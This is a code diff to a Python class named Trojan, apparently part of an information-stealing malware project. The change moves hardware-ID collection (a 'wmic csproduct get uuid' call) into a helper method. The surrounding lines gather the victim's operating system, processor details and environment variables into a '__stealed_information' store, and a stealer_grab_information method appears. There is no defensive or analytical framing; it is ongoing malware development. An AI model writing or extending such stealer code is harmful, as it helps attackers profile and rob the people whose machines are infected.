@@ -214,6 +214,9 @@ class Trojan:
         # Getting computer operating system.
         self.__stealed_information["Computer_OperatingSystem"] = os.getenv("OS")
 
+        # Getting hardware index.
+        self.__stealed_information["Computer_HardwareIndex"] = self.get_hwid()
+
         # Getting computer processor.
         self.__stealed_information["Computer_Processor"] = os.getenv("NUMBER_OF_PROCESSORS") + " cores "
         self.__stealed_information["Computer_Processor"] += os.getenv("PROCESSOR_ARCHITECTURE") + " "
@@ -234,20 +237,6 @@ class Trojan:
 
         # Adding it.
         self.__stealed_information["Computer_EnvironmentVariables"] = variables
-
-        # Getting computer HWID.
-
-        # Command.
-        command = "wmic csproduct get uuid"
-
-        # Process.
-        process = subprocess.Popen(command,
-                                   shell=True, stdin=subprocess.PIPE,
-                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-
-        # Adding it.
-        self.__stealed_information["Computer_HardwareIndex"] = (process.stdout.read() +
-                                                                process.stderr.read()).decode().split("\n")[1]
 
     def stealer_grab_information(self) -> None:
         """
@@ -572,6 +561,25 @@ class Trojan:
             return is_reachable
         except requests.exceptions.ConnectionError:
             pass
+
+    @staticmethod
+    def get_hwid() -> str:
+        """
+        Gets hardware index of the computer.
+        :return: [str] Hardware Index.
+        """
+
+        # Getting computer HWID.
+
+        # Command.
+        command = "wmic csproduct get uuid"
+
+        # Process.
+        process = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,
+                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+        # Adding it.
+        return (process.stdout.read() + process.stderr.read()).decode().split("\n")[1]
 
     @staticmethod
     def path_validate(filename: str) -> None:
